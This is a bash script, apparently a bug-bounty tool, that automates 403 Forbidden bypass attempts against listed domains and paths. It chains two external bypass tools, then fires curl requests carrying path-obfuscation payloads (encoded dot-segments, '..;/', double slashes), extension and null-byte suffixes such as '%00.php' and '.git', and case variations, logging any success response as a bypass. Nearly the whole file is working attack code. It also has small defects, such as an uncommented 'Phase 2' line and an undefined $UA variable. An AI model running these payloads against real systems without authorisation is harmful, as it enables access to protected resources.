#!/bin/bash

INPUT="$1"
OUTPUT="path-bypass-out"
> "$OUTPUT"
#./path-403.sh input [ domain      path ]

# Check if file was provided and exists
if [[ -z "$INPUT" || ! -f "$INPUT" ]]; then
    echo "Usage: $0 <input_file>"
    echo "Error: File '$INPUT' not found!"
    exit 1
fi

##Phase 1
echo "[+] Running 403 bypass tools..."

while IFS=' ' read -r domain path || [[ -n "$domain" ]]; do
    [[ -z "$domain" ]] && continue

    # Handle default path if empty or "/"
    [[ -z "$path" || "$path" == "/" ]] && path="/" || path="/${path#/}"  # normalize path

    echo -e "\n[+] Running 403 bypass on: $domain$path"
    echo "-----------403_BYPASS.SH: $domain$path---------------" >> "$OUTPUT"

    /home/maddy/techiee/bug_bounty/403_bypass/403_bypasser.sh "$domain" "$path" | tee -a 403_temp_log

    grep -Ev '\b(404|403|401|500|501|502|405)\b' 403_temp_log >> "$OUTPUT"

done < "$INPUT"
echo "-----------END 403_BYPASS.SH: $domain$path---------------" >> "$OUTPUT"
rm -f 403_temp_log
echo -e "\n[✔] Done. Results saved to $OUTPUT"

Phase 2
echo -e "\n[+] Phase 2: Running 403-bypasser2.sh for each domain"

while IFS= read -r domain path || [[ -n "$domain" ]]; do
    [[ -z "$domain" ]] && continue

    [[ -z "$path" || "$path" == "/" ]] && path="/" || path="/${path#/}"
    full_url="$domain$path"

    echo -e "\n[+] Running bypass tool 2 for: $full_url"
    echo "-----------403_BYPASS2.SH: $full_url---------------" >> "$OUTPUT"

    /home/maddy/techiee/bug_bounty/403_bypass/403-bypasser2.sh -u "$full_url" --exploit | tee -a 403_temp2_log
    grep -Ev '\b(404|403|401|500|501|502|405)\b' 403_temp2_log >> "$OUTPUT"

done < "$INPUT"
echo "-----------END 403_BYPASS2.SH: $full_url---------------" >> "$OUTPUT"
rm -f 403_temp2_log

echo -e "\n[✔]  bypass tools  tests completed."


##Phase 2
echo -e "\n[+] Phase 2: Path Obfuscation Payload Test"
echo "-----------PHASE 2: ADVANCED PAYLOADS---------------" >> "$OUTPUT"

# Define GOOD codes
GOOD_CODES="200 201 202 203 204 205 206 207 208 209 301 302 307 308"

# Define payloads where 'admin' will be replaced by path
payloads=(
"/admin"
"/admin*"
"/admin/*"
"/admin."
"/%61dmin"
"/admin/"
"/%2e/admin"
"/./admin"
"/;/admin"
"/\/\/\/admin"
"//admin"
"/../admin"
"/../../admin"
"/admin/./"
"/%2Fadmin/"
"/admin/%2e/"
"/admin/%2e%2e/"
"/%2e%2e/admin"
"/..;/admin"
"/admin/"
"/admin%20/"
"/admin%09/"
"/admin%2f/"
"/%2e%2e%2fadmin"
"/Admin"
"/admin/"
"/admin/."
"//admin//"
"/.;/admin"
"/./admin/.."
"/admin.json"
"/;/admin"
"//;//admin"
"/admi%6e"
"/%2e/admin"
"/admin..;/"
"/ADMIN"
"/admin..;/"
)


while IFS=$' 	' read -r domain path || [[ -n "$domain" ]]; do    [[ -z "$path" ]] && path="/"  

    for proto in https http; do
        for payload in "${payloads[@]}"; do

            # Replace "admin" with actual path value (raw, no slash cleanup)
            test_payload="${payload//admin/$path}"

            # Final URL with clean joining
            url="$proto://$domain$test_payload"
            echo $url

            # Send request
            code=$(curl -sk --path-as-is --connect-timeout 10 --max-time 10 \
                -A "Mozilla/5.0" \
                -o /dev/null \
                -w "%{http_code}" \
                "$url")

            echo "GET $url => $code"

            if echo "$GOOD_CODES" | grep -qw "$code"; then
                echo "[+] BYPASS => $code @ $url" >> "$OUTPUT"
            fi
        done
    done

done < "$INPUT"

echo "-----------END PHASE 2---------------" >> "$OUTPUT"

#Phase 3
extensions=(
  ".json" ".css" ".js" ".html" ".php" ".aspx" ".xml" ".txt" ".txt.txt" ".bak" ".old" ".zip" ".tar.gz" ".php.bak" ".php.txt" ".sql" ".git" "%00.html" "%00.js" "%00.css" "%00.json" "%00?redirect=admin" "%00.php" "%00.jpg" "%00.php" "%00file.txt" "%00.zip"
)

GOOD_CODES="200 201 202 204 205 206 301 302 307 308"

# Read input file: domain and path
while IFS= read -r line || [[ -n "$line" ]]; do
    domain=$(echo "$line" | awk '{print $1}')
    path=$(echo "$line" | awk '{print $2}')

    [[ -z "$domain" || -z "$path" ]] && continue
    path="/${path#/}"  # Ensure path starts with one slash

    for proto in https http; do
        for ext in "${extensions[@]}"; do
            base_path="${path%.*}"  # Strip existing extension if any
            single_ext="${base_path}${ext}"

            for final_path in "$single_ext"; do
                url="$proto://$domain$final_path"

                code=$(curl -sk  --path-as-is --connect-timeout 10 --max-time 10 \
                    -A "Mozilla/5.0" \
                    -o /dev/null \
                    -w "%{http_code}" \
                    "$url")

                echo "GET $url => $code"

                if echo "$GOOD_CODES" | grep -qw "$code"; then
                    echo "[+] EXTENSION BYPASS => $code @ $url" >> "$OUTPUT"
                fi
            done
        done
    done

done < "$INPUT"

echo -e "\n[✔] Extension testing completed. Results saved to $OUTPUT"


##Phase4 
# Function to generate mixed-case combinations
function generate_case_combinations() {
    local input="$1"
    local lowercase="$(echo "$input" | tr '[:upper:]' '[:lower:]')"
    local uppercase="$(echo "$input" | tr '[:lower:]' '[:upper:]')"
    local capitalized="$(echo "${input:0:1}" | tr '[:lower:]' '[:upper:]')$(echo "${input:1}" | tr '[:upper:]' '[:lower:]')"
    local rev_capitalized="$(echo "${input:0:1}" | tr '[:upper:]' '[:lower:]')$(echo "${input:1}" | tr '[:lower:]' '[:upper:]')"
    local alt1="$(echo "$input" | sed 's/\(\w\)/\U\1/2')"  # capitalize 2nd letter

    echo "$lowercase"
    echo "$uppercase"
    echo "$capitalized"
    echo "$rev_capitalized"
    echo "$alt1"
}

while IFS=$' \t' read -r domain path || [[ -n "$domain" ]]; do
    [[ -z "$domain" || -z "$path" ]] && continue

    for proto in https http; do
        for variant in $(generate_case_combinations "$path"); do
            url="$proto://$domain/$variant"

            code=$(curl -sk --connect-timeout 10 --max-time 10 \
                -A "$UA" \
                -o /dev/null \
                -w "%{http_code}" \
                "$url")

            echo "GET $url => $code"

            if echo "$GOOD_CODES" | grep -qw "$code"; then
                echo "[+] CASE BYPASS => $code @ $url" >> "$OUTPUT"
            fi
        done
    done

done < "$INPUT"

echo "\n[✔] Case variation bypass test completed. Results saved in $OUTPUT."
